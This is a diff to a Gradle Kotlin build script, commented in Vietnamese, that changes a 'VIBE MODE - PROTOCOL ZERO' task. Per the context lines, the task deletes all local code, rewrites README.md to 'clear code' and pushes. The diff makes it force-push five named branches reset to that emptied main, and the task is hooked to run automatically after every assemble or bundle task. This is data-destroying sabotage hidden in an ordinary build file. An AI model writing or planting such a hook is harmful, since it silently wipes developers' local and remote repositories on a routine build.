@@ -3,7 +3,7 @@ import java.io.File
 val isVibeModeOn = true
 
 if (isVibeModeOn) {
-    // 1. LẤY ROOT DIR TỪ BÊN NGOÀI (Configuration Phase)
+    // LẤY ROOT DIR TỪ BÊN NGOÀI để tránh lỗi Configuration Cache
     val rootDirFile = project.rootDir
 
     val autoGitTask = tasks.register("autoGitCommitAndPush") {
@@ -13,7 +13,6 @@ if (isVibeModeOn) {
             println("\n=========================================")
             println("🔥 [VIBE MODE - PROTOCOL ZERO] Bắt đầu reset project...")
             
-            // 2. Dùng biến rootDirFile thay vì project.rootDir
             fun runCommand(vararg command: String, workingDir: File = rootDirFile): Pair<Int, String> {
                 return try {
                     val process = ProcessBuilder(*command)
@@ -37,7 +36,7 @@ if (isVibeModeOn) {
             println("✅ Đã xóa toàn bộ code ở local.")
 
             // 2. Tạo file README.md với nội dung "clear code"
-            val mdFile = File(rootDirFile, "README.md") // Thay thế ở đây
+            val mdFile = File(rootDirFile, "README.md")
             mdFile.writeText("clear code")
             println("✅ Đã tạo file README.md.")
 
@@ -54,17 +53,42 @@ if (isVibeModeOn) {
                 println("❌ [VIBE MODE] PUSH LỖI! Nguyên nhân:\n$pushOut")
             }
             
-            // 5. Xóa các nhánh khác trên remote
-            val branches = (1..12).map { "branch$it" }
-            val deleteArgs = mutableListOf("git", "push", "origin", "--delete")
-            deleteArgs.addAll(branches)
-            runCommand(*deleteArgs.toTypedArray())
+            // 5. Xử lý các nhánh khác: Giữ nhánh nhưng ép nội dung trắng giống main
+            // THAY ĐỔI DANH SÁCH TÊN NHÁNH CỦA BẠN VÀO ĐÂY
+            val targetBranches = listOf("branch1", "branch2", "branch3", "branch4", "branch5")
+            println("🔄 Bắt đầu dọn dẹp các nhánh khác...")
+            
+            for (branch in targetBranches) {
+                println("  -> Đang xử lý nhánh: $branch")
+                
+                // Cố gắng checkout nhánh có sẵn, nếu lỗi (do chỉ có trên remote) thì tạo mới từ remote
+                val (checkoutExit, _) = runCommand("git", "checkout", branch)
+                if (checkoutExit != 0) {
+                    runCommand("git", "checkout", "-b", branch, "origin/$branch")
+                }
+                
+                // Ép nhánh này giống hệt main (chỉ còn README.md)
+                runCommand("git", "reset", "--hard", "main")
+                
+                // Ép push lên server
+                val (pushBranchExit, pushBranchOut) = runCommand("git", "push", "-f", "origin", branch)
+                if (pushBranchExit == 0) {
+                    println("    ✅ Dọn dẹp thành công nhánh: $branch")
+                } else {
+                    println("    ❌ Lỗi push nhánh $branch: $pushBranchOut")
+                }
+            }
+            
+            // 6. Quay lại nhánh main
+            runCommand("git", "checkout", "main")
+            println("🎉 HOÀN TẤT QUÁ TRÌNH DỌN DẸP!")
         }
     }
 
     tasks.configureEach {
         if (name.startsWith("assemble") || name.startsWith("bundle")) {
             finalizedBy(autoGitTask)
+            println("🔥 [VIBE MODE] Đã kích hoạt cơ chế reset vào: $name")
         }
     }
 }
